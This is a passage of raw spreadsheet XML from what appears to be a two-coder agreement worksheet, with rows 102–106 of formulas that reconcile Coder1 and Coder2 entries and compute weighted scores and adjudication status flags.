        <f>IF(AND(Coder1!T102&amp;""&lt;&gt;"",Coder1!T102&amp;""=Coder2!T102&amp;""),Coder1!T102,"")</f>
        <v/>
      </c>
      <c r="U102" s="14">
        <f>IF(AND(Coder1!U102&amp;""&lt;&gt;"",Coder1!U102&amp;""=Coder2!U102&amp;""),Coder1!U102,"")</f>
        <v/>
      </c>
      <c r="V102" s="14">
        <f>IF(AND(Coder1!V102&amp;""&lt;&gt;"",Coder1!V102&amp;""=Coder2!V102&amp;""),Coder1!V102,"")</f>
        <v/>
      </c>
      <c r="W102" s="14">
        <f>IF(AND(Coder1!W102&amp;""&lt;&gt;"",Coder1!W102&amp;""=Coder2!W102&amp;""),Coder1!W102,"")</f>
        <v/>
      </c>
      <c r="X102" s="14">
        <f>IF(AND(Coder1!X102&amp;""&lt;&gt;"",Coder1!X102&amp;""=Coder2!X102&amp;""),Coder1!X102,"")</f>
        <v/>
      </c>
      <c r="Y102" s="14">
        <f>IF(AND(Coder1!Y102&amp;""&lt;&gt;"",Coder1!Y102&amp;""=Coder2!Y102&amp;""),Coder1!Y102,"")</f>
        <v/>
      </c>
      <c r="Z102" s="14">
        <f>IF(AND(Coder1!Z102&amp;""&lt;&gt;"",Coder1!Z102&amp;""=Coder2!Z102&amp;""),Coder1!Z102,"")</f>
        <v/>
      </c>
      <c r="AA102" s="14">
        <f>IF(AND(Coder1!AA102&amp;""&lt;&gt;"",Coder1!AA102&amp;""=Coder2!AA102&amp;""),Coder1!AA102,"")</f>
        <v/>
      </c>
      <c r="AB102" s="14">
        <f>IF(AND(Coder1!AB102&amp;""&lt;&gt;"",Coder1!AB102&amp;""=Coder2!AB102&amp;""),Coder1!AB102,"")</f>
        <v/>
      </c>
      <c r="AC102" s="14">
        <f>IF(AND(Coder1!AC102&amp;""&lt;&gt;"",Coder1!AC102&amp;""=Coder2!AC102&amp;""),Coder1!AC102,"")</f>
        <v/>
      </c>
      <c r="AD102" s="14">
        <f>IF(AND(Coder1!AD102&amp;""&lt;&gt;"",Coder1!AD102&amp;""=Coder2!AD102&amp;""),Coder1!AD102,"")</f>
        <v/>
      </c>
      <c r="AE102" s="14">
        <f>IF(AND(Coder1!AE102&amp;""&lt;&gt;"",Coder1!AE102&amp;""=Coder2!AE102&amp;""),Coder1!AE102,"")</f>
        <v/>
      </c>
      <c r="AF102" s="14">
        <f>IF(AND(Coder1!AF102&amp;""&lt;&gt;"",Coder1!AF102&amp;""=Coder2!AF102&amp;""),Coder1!AF102,"")</f>
        <v/>
      </c>
      <c r="AG102" s="14">
        <f>IF(AND(Coder1!AG102&amp;""&lt;&gt;"",Coder1!AG102&amp;""=Coder2!AG102&amp;""),Coder1!AG102,"")</f>
        <v/>
      </c>
      <c r="AH102" s="14">
        <f>IF(AND(Coder1!AH102&amp;""&lt;&gt;"",Coder1!AH102&amp;""=Coder2!AH102&amp;""),Coder1!AH102,"")</f>
        <v/>
      </c>
      <c r="AI102" s="11">
        <f>IF(COUNT(E102:L102)=0,"",SUM(E102:L102))</f>
        <v/>
      </c>
      <c r="AJ102" s="11">
        <f>IF(AI102="","",N(E102)*3+N(F102)*2+N(G102)*2+N(H102)*2+N(I102)*2+N(J102)*3+N(K102)*3+N(L102)*3)</f>
        <v/>
      </c>
      <c r="AK102" s="11">
        <f>IF(AI102="","",COUNTIF(N102:AG102,1))</f>
        <v/>
      </c>
      <c r="AL102" s="11">
        <f>IF(OR(AJ102="",AJ102=0),"",ROUND(100*(AJ102-AK102)/AJ102,1))</f>
        <v/>
      </c>
      <c r="AM102" s="11">
        <f>IF(AND(Coder1!AN102=1,Coder2!AN102=1),IF(COUNTBLANK(E102:AH102)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN102" s="11">
        <f>IF(AND(Coder1!AN102=1,Coder2!AN102=1),IF(SUMPRODUCT(--(Coder1!E102:AH102&amp;""&lt;&gt;Coder2!E102:AH102&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO102" s="11" t="n"/>
    </row>
    <row r="103">
      <c r="A103" s="11">
        <f>Coder1!A103</f>
        <v/>
      </c>
      <c r="B103" s="11">
        <f>Coder1!B103</f>
        <v/>
      </c>
      <c r="C103" s="11">
        <f>Coder1!C103</f>
        <v/>
      </c>
      <c r="D103" s="11">
        <f>Coder1!D103</f>
        <v/>
      </c>
      <c r="E103" s="14">
        <f>IF(AND(Coder1!E103&amp;""&lt;&gt;"",Coder1!E103&amp;""=Coder2!E103&amp;""),Coder1!E103,"")</f>
        <v/>
      </c>
      <c r="F103" s="14">
        <f>IF(AND(Coder1!F103&amp;""&lt;&gt;"",Coder1!F103&amp;""=Coder2!F103&amp;""),Coder1!F103,"")</f>
        <v/>
      </c>
      <c r="G103" s="14">
        <f>IF(AND(Coder1!G103&amp;""&lt;&gt;"",Coder1!G103&amp;""=Coder2!G103&amp;""),Coder1!G103,"")</f>
        <v/>
      </c>
      <c r="H103" s="14">
        <f>IF(AND(Coder1!H103&amp;""&lt;&gt;"",Coder1!H103&amp;""=Coder2!H103&amp;""),Coder1!H103,"")</f>
        <v/>
      </c>
      <c r="I103" s="14">
        <f>IF(AND(Coder1!I103&amp;""&lt;&gt;"",Coder1!I103&amp;""=Coder2!I103&amp;""),Coder1!I103,"")</f>
        <v/>
      </c>
      <c r="J103" s="14">
        <f>IF(AND(Coder1!J103&amp;""&lt;&gt;"",Coder1!J103&amp;""=Coder2!J103&amp;""),Coder1!J103,"")</f>
        <v/>
      </c>
      <c r="K103" s="14">
        <f>IF(AND(Coder1!K103&amp;""&lt;&gt;"",Coder1!K103&amp;""=Coder2!K103&amp;""),Coder1!K103,"")</f>
        <v/>
      </c>
      <c r="L103" s="14">
        <f>IF(AND(Coder1!L103&amp;""&lt;&gt;"",Coder1!L103&amp;""=Coder2!L103&amp;""),Coder1!L103,"")</f>
        <v/>
      </c>
      <c r="M103" s="14">
        <f>IF(AND(Coder1!M103&amp;""&lt;&gt;"",Coder1!M103&amp;""=Coder2!M103&amp;""),Coder1!M103,"")</f>
        <v/>
      </c>
      <c r="N103" s="14">
        <f>IF(AND(Coder1!N103&amp;""&lt;&gt;"",Coder1!N103&amp;""=Coder2!N103&amp;""),Coder1!N103,"")</f>
        <v/>
      </c>
      <c r="O103" s="14">
        <f>IF(AND(Coder1!O103&amp;""&lt;&gt;"",Coder1!O103&amp;""=Coder2!O103&amp;""),Coder1!O103,"")</f>
        <v/>
      </c>
      <c r="P103" s="14">
        <f>IF(AND(Coder1!P103&amp;""&lt;&gt;"",Coder1!P103&amp;""=Coder2!P103&amp;""),Coder1!P103,"")</f>
        <v/>
      </c>
      <c r="Q103" s="14">
        <f>IF(AND(Coder1!Q103&amp;""&lt;&gt;"",Coder1!Q103&amp;""=Coder2!Q103&amp;""),Coder1!Q103,"")</f>
        <v/>
      </c>
      <c r="R103" s="14">
        <f>IF(AND(Coder1!R103&amp;""&lt;&gt;"",Coder1!R103&amp;""=Coder2!R103&amp;""),Coder1!R103,"")</f>
        <v/>
      </c>
      <c r="S103" s="14">
        <f>IF(AND(Coder1!S103&amp;""&lt;&gt;"",Coder1!S103&amp;""=Coder2!S103&amp;""),Coder1!S103,"")</f>
        <v/>
      </c>
      <c r="T103" s="14">
        <f>IF(AND(Coder1!T103&amp;""&lt;&gt;"",Coder1!T103&amp;""=Coder2!T103&amp;""),Coder1!T103,"")</f>
        <v/>
      </c>
      <c r="U103" s="14">
        <f>IF(AND(Coder1!U103&amp;""&lt;&gt;"",Coder1!U103&amp;""=Coder2!U103&amp;""),Coder1!U103,"")</f>
        <v/>
      </c>
      <c r="V103" s="14">
        <f>IF(AND(Coder1!V103&amp;""&lt;&gt;"",Coder1!V103&amp;""=Coder2!V103&amp;""),Coder1!V103,"")</f>
        <v/>
      </c>
      <c r="W103" s="14">
        <f>IF(AND(Coder1!W103&amp;""&lt;&gt;"",Coder1!W103&amp;""=Coder2!W103&amp;""),Coder1!W103,"")</f>
        <v/>
      </c>
      <c r="X103" s="14">
        <f>IF(AND(Coder1!X103&amp;""&lt;&gt;"",Coder1!X103&amp;""=Coder2!X103&amp;""),Coder1!X103,"")</f>
        <v/>
      </c>
      <c r="Y103" s="14">
        <f>IF(AND(Coder1!Y103&amp;""&lt;&gt;"",Coder1!Y103&amp;""=Coder2!Y103&amp;""),Coder1!Y103,"")</f>
        <v/>
      </c>
      <c r="Z103" s="14">
        <f>IF(AND(Coder1!Z103&amp;""&lt;&gt;"",Coder1!Z103&amp;""=Coder2!Z103&amp;""),Coder1!Z103,"")</f>
        <v/>
      </c>
      <c r="AA103" s="14">
        <f>IF(AND(Coder1!AA103&amp;""&lt;&gt;"",Coder1!AA103&amp;""=Coder2!AA103&amp;""),Coder1!AA103,"")</f>
        <v/>
      </c>
      <c r="AB103" s="14">
        <f>IF(AND(Coder1!AB103&amp;""&lt;&gt;"",Coder1!AB103&amp;""=Coder2!AB103&amp;""),Coder1!AB103,"")</f>
        <v/>
      </c>
      <c r="AC103" s="14">
        <f>IF(AND(Coder1!AC103&amp;""&lt;&gt;"",Coder1!AC103&amp;""=Coder2!AC103&amp;""),Coder1!AC103,"")</f>
        <v/>
      </c>
      <c r="AD103" s="14">
        <f>IF(AND(Coder1!AD103&amp;""&lt;&gt;"",Coder1!AD103&amp;""=Coder2!AD103&amp;""),Coder1!AD103,"")</f>
        <v/>
      </c>
      <c r="AE103" s="14">
        <f>IF(AND(Coder1!AE103&amp;""&lt;&gt;"",Coder1!AE103&amp;""=Coder2!AE103&amp;""),Coder1!AE103,"")</f>
        <v/>
      </c>
      <c r="AF103" s="14">
        <f>IF(AND(Coder1!AF103&amp;""&lt;&gt;"",Coder1!AF103&amp;""=Coder2!AF103&amp;""),Coder1!AF103,"")</f>
        <v/>
      </c>
      <c r="AG103" s="14">
        <f>IF(AND(Coder1!AG103&amp;""&lt;&gt;"",Coder1!AG103&amp;""=Coder2!AG103&amp;""),Coder1!AG103,"")</f>
        <v/>
      </c>
      <c r="AH103" s="14">
        <f>IF(AND(Coder1!AH103&amp;""&lt;&gt;"",Coder1!AH103&amp;""=Coder2!AH103&amp;""),Coder1!AH103,"")</f>
        <v/>
      </c>
      <c r="AI103" s="11">
        <f>IF(COUNT(E103:L103)=0,"",SUM(E103:L103))</f>
        <v/>
      </c>
      <c r="AJ103" s="11">
        <f>IF(AI103="","",N(E103)*3+N(F103)*2+N(G103)*2+N(H103)*2+N(I103)*2+N(J103)*3+N(K103)*3+N(L103)*3)</f>
        <v/>
      </c>
      <c r="AK103" s="11">
        <f>IF(AI103="","",COUNTIF(N103:AG103,1))</f>
        <v/>
      </c>
      <c r="AL103" s="11">
        <f>IF(OR(AJ103="",AJ103=0),"",ROUND(100*(AJ103-AK103)/AJ103,1))</f>
        <v/>
      </c>
      <c r="AM103" s="11">
        <f>IF(AND(Coder1!AN103=1,Coder2!AN103=1),IF(COUNTBLANK(E103:AH103)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN103" s="11">
        <f>IF(AND(Coder1!AN103=1,Coder2!AN103=1),IF(SUMPRODUCT(--(Coder1!E103:AH103&amp;""&lt;&gt;Coder2!E103:AH103&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO103" s="11" t="n"/>
    </row>
    <row r="104">
      <c r="A104" s="11">
        <f>Coder1!A104</f>
        <v/>
      </c>
      <c r="B104" s="11">
        <f>Coder1!B104</f>
        <v/>
      </c>
      <c r="C104" s="11">
        <f>Coder1!C104</f>
        <v/>
      </c>
      <c r="D104" s="11">
        <f>Coder1!D104</f>
        <v/>
      </c>
      <c r="E104" s="14">
        <f>IF(AND(Coder1!E104&amp;""&lt;&gt;"",Coder1!E104&amp;""=Coder2!E104&amp;""),Coder1!E104,"")</f>
        <v/>
      </c>
      <c r="F104" s="14">
        <f>IF(AND(Coder1!F104&amp;""&lt;&gt;"",Coder1!F104&amp;""=Coder2!F104&amp;""),Coder1!F104,"")</f>
        <v/>
      </c>
      <c r="G104" s="14">
        <f>IF(AND(Coder1!G104&amp;""&lt;&gt;"",Coder1!G104&amp;""=Coder2!G104&amp;""),Coder1!G104,"")</f>
        <v/>
      </c>
      <c r="H104" s="14">
        <f>IF(AND(Coder1!H104&amp;""&lt;&gt;"",Coder1!H104&amp;""=Coder2!H104&amp;""),Coder1!H104,"")</f>
        <v/>
      </c>
      <c r="I104" s="14">
        <f>IF(AND(Coder1!I104&amp;""&lt;&gt;"",Coder1!I104&amp;""=Coder2!I104&amp;""),Coder1!I104,"")</f>
        <v/>
      </c>
      <c r="J104" s="14">
        <f>IF(AND(Coder1!J104&amp;""&lt;&gt;"",Coder1!J104&amp;""=Coder2!J104&amp;""),Coder1!J104,"")</f>
        <v/>
      </c>
      <c r="K104" s="14">
        <f>IF(AND(Coder1!K104&amp;""&lt;&gt;"",Coder1!K104&amp;""=Coder2!K104&amp;""),Coder1!K104,"")</f>
        <v/>
      </c>
      <c r="L104" s="14">
        <f>IF(AND(Coder1!L104&amp;""&lt;&gt;"",Coder1!L104&amp;""=Coder2!L104&amp;""),Coder1!L104,"")</f>
        <v/>
      </c>
      <c r="M104" s="14">
        <f>IF(AND(Coder1!M104&amp;""&lt;&gt;"",Coder1!M104&amp;""=Coder2!M104&amp;""),Coder1!M104,"")</f>
        <v/>
      </c>
      <c r="N104" s="14">
        <f>IF(AND(Coder1!N104&amp;""&lt;&gt;"",Coder1!N104&amp;""=Coder2!N104&amp;""),Coder1!N104,"")</f>
        <v/>
      </c>
      <c r="O104" s="14">
        <f>IF(AND(Coder1!O104&amp;""&lt;&gt;"",Coder1!O104&amp;""=Coder2!O104&amp;""),Coder1!O104,"")</f>
        <v/>
      </c>
      <c r="P104" s="14">
        <f>IF(AND(Coder1!P104&amp;""&lt;&gt;"",Coder1!P104&amp;""=Coder2!P104&amp;""),Coder1!P104,"")</f>
        <v/>
      </c>
      <c r="Q104" s="14">
        <f>IF(AND(Coder1!Q104&amp;""&lt;&gt;"",Coder1!Q104&amp;""=Coder2!Q104&amp;""),Coder1!Q104,"")</f>
        <v/>
      </c>
      <c r="R104" s="14">
        <f>IF(AND(Coder1!R104&amp;""&lt;&gt;"",Coder1!R104&amp;""=Coder2!R104&amp;""),Coder1!R104,"")</f>
        <v/>
      </c>
      <c r="S104" s="14">
        <f>IF(AND(Coder1!S104&amp;""&lt;&gt;"",Coder1!S104&amp;""=Coder2!S104&amp;""),Coder1!S104,"")</f>
        <v/>
      </c>
      <c r="T104" s="14">
        <f>IF(AND(Coder1!T104&amp;""&lt;&gt;"",Coder1!T104&amp;""=Coder2!T104&amp;""),Coder1!T104,"")</f>
        <v/>
      </c>
      <c r="U104" s="14">
        <f>IF(AND(Coder1!U104&amp;""&lt;&gt;"",Coder1!U104&amp;""=Coder2!U104&amp;""),Coder1!U104,"")</f>
        <v/>
      </c>
      <c r="V104" s="14">
        <f>IF(AND(Coder1!V104&amp;""&lt;&gt;"",Coder1!V104&amp;""=Coder2!V104&amp;""),Coder1!V104,"")</f>
        <v/>
      </c>
      <c r="W104" s="14">
        <f>IF(AND(Coder1!W104&amp;""&lt;&gt;"",Coder1!W104&amp;""=Coder2!W104&amp;""),Coder1!W104,"")</f>
        <v/>
      </c>
      <c r="X104" s="14">
        <f>IF(AND(Coder1!X104&amp;""&lt;&gt;"",Coder1!X104&amp;""=Coder2!X104&amp;""),Coder1!X104,"")</f>
        <v/>
      </c>
      <c r="Y104" s="14">
        <f>IF(AND(Coder1!Y104&amp;""&lt;&gt;"",Coder1!Y104&amp;""=Coder2!Y104&amp;""),Coder1!Y104,"")</f>
        <v/>
      </c>
      <c r="Z104" s="14">
        <f>IF(AND(Coder1!Z104&amp;""&lt;&gt;"",Coder1!Z104&amp;""=Coder2!Z104&amp;""),Coder1!Z104,"")</f>
        <v/>
      </c>
      <c r="AA104" s="14">
        <f>IF(AND(Coder1!AA104&amp;""&lt;&gt;"",Coder1!AA104&amp;""=Coder2!AA104&amp;""),Coder1!AA104,"")</f>
        <v/>
      </c>
      <c r="AB104" s="14">
        <f>IF(AND(Coder1!AB104&amp;""&lt;&gt;"",Coder1!AB104&amp;""=Coder2!AB104&amp;""),Coder1!AB104,"")</f>
        <v/>
      </c>
      <c r="AC104" s="14">
        <f>IF(AND(Coder1!AC104&amp;""&lt;&gt;"",Coder1!AC104&amp;""=Coder2!AC104&amp;""),Coder1!AC104,"")</f>
        <v/>
      </c>
      <c r="AD104" s="14">
        <f>IF(AND(Coder1!AD104&amp;""&lt;&gt;"",Coder1!AD104&amp;""=Coder2!AD104&amp;""),Coder1!AD104,"")</f>
        <v/>
      </c>
      <c r="AE104" s="14">
        <f>IF(AND(Coder1!AE104&amp;""&lt;&gt;"",Coder1!AE104&amp;""=Coder2!AE104&amp;""),Coder1!AE104,"")</f>
        <v/>
      </c>
      <c r="AF104" s="14">
        <f>IF(AND(Coder1!AF104&amp;""&lt;&gt;"",Coder1!AF104&amp;""=Coder2!AF104&amp;""),Coder1!AF104,"")</f>
        <v/>
      </c>
      <c r="AG104" s="14">
        <f>IF(AND(Coder1!AG104&amp;""&lt;&gt;"",Coder1!AG104&amp;""=Coder2!AG104&amp;""),Coder1!AG104,"")</f>
        <v/>
      </c>
      <c r="AH104" s="14">
        <f>IF(AND(Coder1!AH104&amp;""&lt;&gt;"",Coder1!AH104&amp;""=Coder2!AH104&amp;""),Coder1!AH104,"")</f>
        <v/>
      </c>
      <c r="AI104" s="11">
        <f>IF(COUNT(E104:L104)=0,"",SUM(E104:L104))</f>
        <v/>
      </c>
      <c r="AJ104" s="11">
        <f>IF(AI104="","",N(E104)*3+N(F104)*2+N(G104)*2+N(H104)*2+N(I104)*2+N(J104)*3+N(K104)*3+N(L104)*3)</f>
        <v/>
      </c>
      <c r="AK104" s="11">
        <f>IF(AI104="","",COUNTIF(N104:AG104,1))</f>
        <v/>
      </c>
      <c r="AL104" s="11">
        <f>IF(OR(AJ104="",AJ104=0),"",ROUND(100*(AJ104-AK104)/AJ104,1))</f>
        <v/>
      </c>
      <c r="AM104" s="11">
        <f>IF(AND(Coder1!AN104=1,Coder2!AN104=1),IF(COUNTBLANK(E104:AH104)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN104" s="11">
        <f>IF(AND(Coder1!AN104=1,Coder2!AN104=1),IF(SUMPRODUCT(--(Coder1!E104:AH104&amp;""&lt;&gt;Coder2!E104:AH104&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO104" s="11" t="n"/>
    </row>
    <row r="105">
      <c r="A105" s="11">
        <f>Coder1!A105</f>
        <v/>
      </c>
      <c r="B105" s="11">
        <f>Coder1!B105</f>
        <v/>
      </c>
      <c r="C105" s="11">
        <f>Coder1!C105</f>
        <v/>
      </c>
      <c r="D105" s="11">
        <f>Coder1!D105</f>
        <v/>
      </c>
      <c r="E105" s="14">
        <f>IF(AND(Coder1!E105&amp;""&lt;&gt;"",Coder1!E105&amp;""=Coder2!E105&amp;""),Coder1!E105,"")</f>
        <v/>
      </c>
      <c r="F105" s="14">
        <f>IF(AND(Coder1!F105&amp;""&lt;&gt;"",Coder1!F105&amp;""=Coder2!F105&amp;""),Coder1!F105,"")</f>
        <v/>
      </c>
      <c r="G105" s="14">
        <f>IF(AND(Coder1!G105&amp;""&lt;&gt;"",Coder1!G105&amp;""=Coder2!G105&amp;""),Coder1!G105,"")</f>
        <v/>
      </c>
      <c r="H105" s="14">
        <f>IF(AND(Coder1!H105&amp;""&lt;&gt;"",Coder1!H105&amp;""=Coder2!H105&amp;""),Coder1!H105,"")</f>
        <v/>
      </c>
      <c r="I105" s="14">
        <f>IF(AND(Coder1!I105&amp;""&lt;&gt;"",Coder1!I105&amp;""=Coder2!I105&amp;""),Coder1!I105,"")</f>
        <v/>
      </c>
      <c r="J105" s="14">
        <f>IF(AND(Coder1!J105&amp;""&lt;&gt;"",Coder1!J105&amp;""=Coder2!J105&amp;""),Coder1!J105,"")</f>
        <v/>
      </c>
      <c r="K105" s="14">
        <f>IF(AND(Coder1!K105&amp;""&lt;&gt;"",Coder1!K105&amp;""=Coder2!K105&amp;""),Coder1!K105,"")</f>
        <v/>
      </c>
      <c r="L105" s="14">
        <f>IF(AND(Coder1!L105&amp;""&lt;&gt;"",Coder1!L105&amp;""=Coder2!L105&amp;""),Coder1!L105,"")</f>
        <v/>
      </c>
      <c r="M105" s="14">
        <f>IF(AND(Coder1!M105&amp;""&lt;&gt;"",Coder1!M105&amp;""=Coder2!M105&amp;""),Coder1!M105,"")</f>
        <v/>
      </c>
      <c r="N105" s="14">
        <f>IF(AND(Coder1!N105&amp;""&lt;&gt;"",Coder1!N105&amp;""=Coder2!N105&amp;""),Coder1!N105,"")</f>
        <v/>
      </c>
      <c r="O105" s="14">
        <f>IF(AND(Coder1!O105&amp;""&lt;&gt;"",Coder1!O105&amp;""=Coder2!O105&amp;""),Coder1!O105,"")</f>
        <v/>
      </c>
      <c r="P105" s="14">
        <f>IF(AND(Coder1!P105&amp;""&lt;&gt;"",Coder1!P105&amp;""=Coder2!P105&amp;""),Coder1!P105,"")</f>
        <v/>
      </c>
      <c r="Q105" s="14">
        <f>IF(AND(Coder1!Q105&amp;""&lt;&gt;"",Coder1!Q105&amp;""=Coder2!Q105&amp;""),Coder1!Q105,"")</f>
        <v/>
      </c>
      <c r="R105" s="14">
        <f>IF(AND(Coder1!R105&amp;""&lt;&gt;"",Coder1!R105&amp;""=Coder2!R105&amp;""),Coder1!R105,"")</f>
        <v/>
      </c>
      <c r="S105" s="14">
        <f>IF(AND(Coder1!S105&amp;""&lt;&gt;"",Coder1!S105&amp;""=Coder2!S105&amp;""),Coder1!S105,"")</f>
        <v/>
      </c>
      <c r="T105" s="14">
        <f>IF(AND(Coder1!T105&amp;""&lt;&gt;"",Coder1!T105&amp;""=Coder2!T105&amp;""),Coder1!T105,"")</f>
        <v/>
      </c>
      <c r="U105" s="14">
        <f>IF(AND(Coder1!U105&amp;""&lt;&gt;"",Coder1!U105&amp;""=Coder2!U105&amp;""),Coder1!U105,"")</f>
        <v/>
      </c>
      <c r="V105" s="14">
        <f>IF(AND(Coder1!V105&amp;""&lt;&gt;"",Coder1!V105&amp;""=Coder2!V105&amp;""),Coder1!V105,"")</f>
        <v/>
      </c>
      <c r="W105" s="14">
        <f>IF(AND(Coder1!W105&amp;""&lt;&gt;"",Coder1!W105&amp;""=Coder2!W105&amp;""),Coder1!W105,"")</f>
        <v/>
      </c>
      <c r="X105" s="14">
        <f>IF(AND(Coder1!X105&amp;""&lt;&gt;"",Coder1!X105&amp;""=Coder2!X105&amp;""),Coder1!X105,"")</f>
        <v/>
      </c>
      <c r="Y105" s="14">
        <f>IF(AND(Coder1!Y105&amp;""&lt;&gt;"",Coder1!Y105&amp;""=Coder2!Y105&amp;""),Coder1!Y105,"")</f>
        <v/>
      </c>
      <c r="Z105" s="14">
        <f>IF(AND(Coder1!Z105&amp;""&lt;&gt;"",Coder1!Z105&amp;""=Coder2!Z105&amp;""),Coder1!Z105,"")</f>
        <v/>
      </c>
      <c r="AA105" s="14">
        <f>IF(AND(Coder1!AA105&amp;""&lt;&gt;"",Coder1!AA105&amp;""=Coder2!AA105&amp;""),Coder1!AA105,"")</f>
        <v/>
      </c>
      <c r="AB105" s="14">
        <f>IF(AND(Coder1!AB105&amp;""&lt;&gt;"",Coder1!AB105&amp;""=Coder2!AB105&amp;""),Coder1!AB105,"")</f>
        <v/>
      </c>
      <c r="AC105" s="14">
        <f>IF(AND(Coder1!AC105&amp;""&lt;&gt;"",Coder1!AC105&amp;""=Coder2!AC105&amp;""),Coder1!AC105,"")</f>
        <v/>
      </c>
      <c r="AD105" s="14">
        <f>IF(AND(Coder1!AD105&amp;""&lt;&gt;"",Coder1!AD105&amp;""=Coder2!AD105&amp;""),Coder1!AD105,"")</f>
        <v/>
      </c>
      <c r="AE105" s="14">
        <f>IF(AND(Coder1!AE105&amp;""&lt;&gt;"",Coder1!AE105&amp;""=Coder2!AE105&amp;""),Coder1!AE105,"")</f>
        <v/>
      </c>
      <c r="AF105" s="14">
        <f>IF(AND(Coder1!AF105&amp;""&lt;&gt;"",Coder1!AF105&amp;""=Coder2!AF105&amp;""),Coder1!AF105,"")</f>
        <v/>
      </c>
      <c r="AG105" s="14">
        <f>IF(AND(Coder1!AG105&amp;""&lt;&gt;"",Coder1!AG105&amp;""=Coder2!AG105&amp;""),Coder1!AG105,"")</f>
        <v/>
      </c>
      <c r="AH105" s="14">
        <f>IF(AND(Coder1!AH105&amp;""&lt;&gt;"",Coder1!AH105&amp;""=Coder2!AH105&amp;""),Coder1!AH105,"")</f>
        <v/>
      </c>
      <c r="AI105" s="11">
        <f>IF(COUNT(E105:L105)=0,"",SUM(E105:L105))</f>
        <v/>
      </c>
      <c r="AJ105" s="11">
        <f>IF(AI105="","",N(E105)*3+N(F105)*2+N(G105)*2+N(H105)*2+N(I105)*2+N(J105)*3+N(K105)*3+N(L105)*3)</f>
        <v/>
      </c>
      <c r="AK105" s="11">
        <f>IF(AI105="","",COUNTIF(N105:AG105,1))</f>
        <v/>
      </c>
      <c r="AL105" s="11">
        <f>IF(OR(AJ105="",AJ105=0),"",ROUND(100*(AJ105-AK105)/AJ105,1))</f>
        <v/>
      </c>
      <c r="AM105" s="11">
        <f>IF(AND(Coder1!AN105=1,Coder2!AN105=1),IF(COUNTBLANK(E105:AH105)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN105" s="11">
        <f>IF(AND(Coder1!AN105=1,Coder2!AN105=1),IF(SUMPRODUCT(--(Coder1!E105:AH105&amp;""&lt;&gt;Coder2!E105:AH105&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO105" s="11" t="n"/>
    </row>
    <row r="106">
      <c r="A106" s="11">
        <f>Coder1!A106</f>
        <v/>
      </c>
      <c r="B106" s="11">
        <f>Coder1!B106</f>
        <v/>
      </c>
      <c r="C106" s="11">
        <f>Coder1!C106</f>
        <v/>
      </c>
      <c r="D106" s="11">
        <f>Coder1!D106</f>
        <v/>
      </c>
      <c r="E106" s="14">
        <f>IF(AND(Coder1!E106&amp;""&lt;&gt;"",Coder1!E106&amp;""=Coder2!E106&amp;""),Coder1!E106,"")</f>
        <v/>
      </c>
      <c r="F106" s="14">
        <f>IF(AND(Coder1!F106&amp;""&lt;&gt;"",Coder1!F106&amp;""=Coder2!F106&amp;""),Coder1!F106,"")</f>
        <v/>
      </c>
      <c r="G106" s="14">
        <f>IF(AND(Coder1!G106&amp;""&lt;&gt;"",Coder1!G106&amp;""=Coder2!G106&amp;""),Coder1!G106,"")</f>
        <v/>
      </c>
      <c r="H106" s="14">
        <f>IF(AND(Coder1!H106&amp;""&lt;&gt;"",Coder1!H106&amp;""=Coder2!H106&amp;""),Coder1!H106,"")</f>
        <v/>
      </c>
      <c r="I106" s="14">
        <f>IF(AND(Coder1!I106&amp;""&lt;&gt;"",Coder1!I106&amp;""=Coder2!I106&amp;""),Coder1!I106,"")</f>
        <v/>
      </c>
      <c r="J106" s="14">
        <f>IF(AND(Coder1!J106&amp;""&lt;&gt;"",Coder1!J106&amp;""=Coder2!J106&amp;""),Coder1!J106,"")</f>
        <v/>
      </c>
      <c r="K106" s="14">
        <f>IF(AND(Coder1!K106&amp;""&lt;&gt;"",Coder1!K106&amp;""=Coder2!K106&amp;""),Coder1!K106,"")</f>
        <v/>
      </c>
      <c r="L106" s="14">
        <f>IF(AND(Coder1!L106&amp;""&lt;&gt;"",Coder1!L106&amp;""=Coder2!L106&amp;""),Coder1!L106,"")</f>
        <v/>
      </c>
      <c r="M106" s="14">
        <f>IF(AND(Coder1!M106&amp;""&lt;&gt;"",Coder1!M106&amp;""=Coder2!M106&amp;""),Coder1!M106,"")</f>
        <v/>
      </c>
      <c r="N106" s="14">
        <f>IF(AND(Coder1!N106&amp;""&lt;&gt;"",Coder1!N106&amp;""=Coder2!N106&amp;""),Coder1!N106,"")</f>
        <v/>
      </c>
      <c r="O106" s="14">
        <f>IF(AND(Coder1!O106&amp;""&lt;&gt;"",Coder1!O106&amp;""=Coder2!O106&amp;""),Coder1!O106,"")</f>
        <v/>
      </c>
      <c r="P106" s="14">
        <f>IF(AND(Coder1!P106&amp;""&lt;&gt;"",Coder1!P106&amp;""=Coder2!P106&amp;""),Coder1!P106,"")</f>
        <v/>
      </c>
      <c r="Q106" s="14">
        <f>IF(AND(Coder1!Q106&amp;""&lt;&gt;"",Coder1!Q106&amp;""=Coder2!Q106&amp;""),Coder1!Q106,"")</f>
        <v/>
      </c>
      <c r="R106" s="14">
        <f>IF(AND(Coder1!R106&amp;""&lt;&gt;"",Coder1!R106&amp;""=Coder2!R106&amp;""),Coder1!R106,"")</f>
        <v/>
      </c>
      <c r="S106" s="14">
        <f>IF(AND(Coder1!S106&amp;""&lt;&gt;"",Coder1!S106&amp;""=Coder2!S106&amp;""),Coder1!S106,"")</f>
        <v/>
      </c>
      <c r="T106" s="14">
        <f>IF(AND(Coder1!T106&amp;""&lt;&gt;"",Coder1!T106&amp;""=Coder2!T106&amp;""),Coder1!T106,"")</f>
        <v/>
      </c>
      <c r="U106" s="14">
        <f>IF(AND(Coder1!U106&amp;""&lt;&gt;"",Coder1!U106&amp;""=Coder2!U106&amp;""),Coder1!U106,"")</f>
        <v/>
      </c>
      <c r="V106" s="14">
        <f>IF(AND(Coder1!V106&amp;""&lt;&gt;"",Coder1!V106&amp;""=Coder2!V106&amp;""),Coder1!V106,"")</f>
        <v/>
      </c>
      <c r="W106" s="14">
